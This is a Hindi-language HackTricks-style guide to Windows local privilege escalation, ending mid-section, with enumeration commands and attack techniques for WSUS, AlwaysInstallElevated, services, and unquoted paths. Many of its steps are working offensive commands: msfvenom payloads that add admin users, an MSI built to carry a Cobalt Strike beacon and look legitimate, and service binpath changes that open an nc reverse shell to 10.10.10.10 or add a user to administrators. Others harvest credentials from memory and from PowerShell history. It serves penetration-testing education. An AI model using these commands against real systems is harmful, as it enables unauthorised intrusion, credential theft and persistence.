# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारम्भिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीज़ें हैं जो आपकी सिस्टम की **prevent you from enumerating the system** करने, executables चलाने या यहाँ तक कि आपकी गतिविधियों को **detect your activities** करने में बाधा बन सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित **page** को **read** करके इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### Version जानकारी enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability तो नहीं है (लागू किए गए patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक security vulnerabilities हैं, जो एक Windows environment द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### एनवायरनमेंट

क्या कोई credential/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

आप सीख सकते हैं कि इसे कैसे चालू किया जाए: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादनों का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशन और स्क्रिप्ट के हिस्से शामिल हैं। हालांकि, पूरा निष्पादन विवरण और आउटपुट परिणाम दर्ज नहीं हो सकते।

इसे सक्षम करने के लिए, डॉक्यूमेंटेशन के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को चुनें, **"Powershell Transcription"** के बजाय।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप निष्पादित कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के execution की पूरी activity और पूरा content रिकॉर्ड कैपचर किया जाता है, जिससे यह सुनिश्चित होता है कि हर block of code को उसे चलने के दौरान document किया गया है। यह प्रक्रिया प्रत्येक activity का एक व्यापक audit trail संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। execution के समय सभी activity को document करके, प्रोसेस के बारे में विस्तृत insights प्रदान किए जाते हैं।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लिए लॉगिंग इवेंट्स Windows Event Viewer में इस पाथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
पिछले 20 इवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि updates http**S** की बजाय http के माध्यम से अनुरोधित किए जाते हैं तो आप सिस्टम compromise कर सकते हैं।

आप जांच शुरू करते हैं कि क्या नेटवर्क non-SSL WSUS update का उपयोग कर रहा है — इसके लिए cmd में निम्नलिखित चलाएँ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको ऐसा कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और अगर `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` बराबर `1` है।

तो, **यह शोषण योग्य है।** अगर आख़िरी registry का मान 0 है, तो WSUS एंट्री को अनदेखा कर दिया जाएगा।

इन कमजोरियों का शोषण करने के लिए आप इन टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS ट्रैफिक में 'fake' updates इंजेक्ट करते हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मूल रूप से, यह वह दोष है जिसका यह बग शोषण करता है:

> अगर हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates Internet Explorer की settings में configure किए गए proxy का उपयोग करता है, तो हम लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपनी ही ट्रैफिक को intercept कर सकते हैं और अपने asset पर elevated user के रूप में कोड चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS सेवा current user की settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगा। यदि हम WSUS hostname के लिए एक self-signed certificate जेनरेट करते हैं और इसे current user के certificate store में जोड़ देते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफिक को intercept कर पाएंगे। WSUS किसी HSTS-जैसी प्रणाली का उपयोग नहीं करता जो certificate पर trust-on-first-use प्रकार की validation लागू करे। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और सही hostname है, तो सेवा इसे स्वीकार कर लेगी।

आप इस vulnerability का शोषण टूल [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके कर सकते हैं (जब यह उपलब्ध हो)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update channel expose करते हैं। यदि enrollment को एक attacker server पर बलपूर्वक मोड़ा जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करे, तो एक local user एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM सेवा इंस्टॉल कर देती है। एक सामान्यीकृत तकनीक देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहां:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows डोमेन environments में कुछ विशिष्ट शर्तों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन शर्तों में वे वातावरण शामिल हैं जहाँ **LDAP signing लागू नहीं है**, उपयोगकर्ताओं के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं को डोमेन के भीतर कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **आवश्यकताएँ** default settings का उपयोग करते हुए पूरी हो जाती हैं।

एक्सप्लॉइट खोजें [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

अटैक के फ्लो के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये दोनों रजिस्ट्री मान **enabled** हैं (मान **0x1**), तो किसी भी privilege वाले उपयोगकर्ता `*.msi` फाइलें NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है तो आप इस technique को module **`exploit/windows/local/always_install_elevated`** का उपयोग करके automate कर सकते हैं।

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान निर्देशिका में प्रिविलेज बढ़ाने के लिए एक Windows MSI बाइनरी बनाई जा सके। यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group जोड़ने के लिए prompt करती है (तो आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को execute करके escalate privileges प्राप्त करें।

### MSI Wrapper

इस tutorial को पढ़ें ताकि आप MSI wrapper बनाना सीख सकें। ध्यान दें कि आप एक "**.bat**" file को wrap कर सकते हैं अगर आप **just** command lines **execute** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit के साथ `C:\privesc\beacon.exe` में **new Windows EXE TCP payload** **Generate** करें
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर न पहुंचें। **Add** पर क्लिक करें और अभी जनरेट किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखने में मदद कर सकते हैं।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। यह सुनिश्चित करेगा कि installer run होते ही beacon payload executed हो।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- अगर warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जा रहे हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** किसी डोमेन से जुड़े कंप्यूटरों पर स्थानीय Administrator पासवर्ड्स के प्रबंधन के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड अद्वितीय, यादृच्छिक और नियमित रूप से अपडेट होता है। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमति दी गई हो, जिससे वे अधिकृत होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय हो, तो **plain-text passwords LSASS में संग्रहीत होते हैं** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अविश्वसनीय प्रक्रियाओं द्वारा **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोका जा सके**, जिससे सिस्टम और अधिक सुरक्षित हुआ।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** का प्रमाणीकरण **Local Security Authority** (LSA) द्वारा किया जाता है और इन्हें ऑपरेटिंग सिस्टम घटक उपयोग करते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित हो जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूह सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं, क्या किसी के पास दिलचस्प अनुमतियाँ हैं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप किसी **privileged group** के सदस्य हैं तो आप संभवतः **escalate privileges** कर सकते हैं। Privileged groups और उन्हें कैसे abuse करके escalate privileges किया जा सकता है, इसके बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि यह **token** क्या है, इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्न पृष्ठ देखें ताकि आप **interesting tokens के बारे में जान सकें** और उन्हें कैसे abuse करना है:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रोसेस की सूची बनाते समय **प्रोसेस की command line के अंदर पासवर्ड की जाँच करें**.\
जाँच करें कि क्या आप किसी चल रही बाइनरी को **ओवरराइट कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर में लिखने की अनुमति है ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हों — आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों के permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी चल रहे प्रोसेस का memory dump बना सकते हैं। FTP जैसी सेवाओं की मेमोरी में अक्सर **credentials in clear text in memory** होते हैं — मेमोरी को dump करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI apps

**SYSTEM के रूप में चलने वाले Applications उपयोगकर्ता को CMD spawn करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## Services

Service Triggers Windows को तब service शुरू करने देते हैं जब कुछ शर्तें पूरी हों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर उनके triggers को फायर करके privileged services शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक सेवा के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ के binary **accesschk** का होना अनुशंसित है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसित है कि जाँच करें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं या नहीं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सर्विस सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती, क्योंकि यह अक्षम है या इसके साथ कोई सक्षम डिवाइस जुड़ा हुआ नहीं है._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि सेवा upnphost के काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और समाधान** है चलाना:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पथ संशोधित करें**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी सेवा पर **SERVICE_ALL_ACCESS** अधिकार है, सेवा की निष्पादन योग्य बाइनरी को संशोधित करना संभव होता है। बाइनरी को संशोधित करने और **sc** को चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary की reconfiguration की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता प्रदान करता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी प्रदान करता है।

इस vulnerability के detection और exploitation के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

**Check if you can modify the binary that is executed by a service** या यह जाँचें कि क्या आपके पास उस फ़ोल्डर पर **write permissions** हैं जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप service द्वारा execute किए जाने वाले हर binary को **wmic** (not in system32) का उपयोग करके प्राप्त कर सकते हैं और अपनी permissions **icacls** का उपयोग करके जाँच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जाँच** सकते हैं इस तरह:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो सर्विस द्वारा निष्पादित बाइनरी को बदला जा सकता है।

निष्पादित बाइनरी के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में यह **arbitrary code चलाने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows हर space से पहले वाले ending को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths सूचीबद्ध करें, जो built-in Windows services से संबंधित न हों:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit से एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

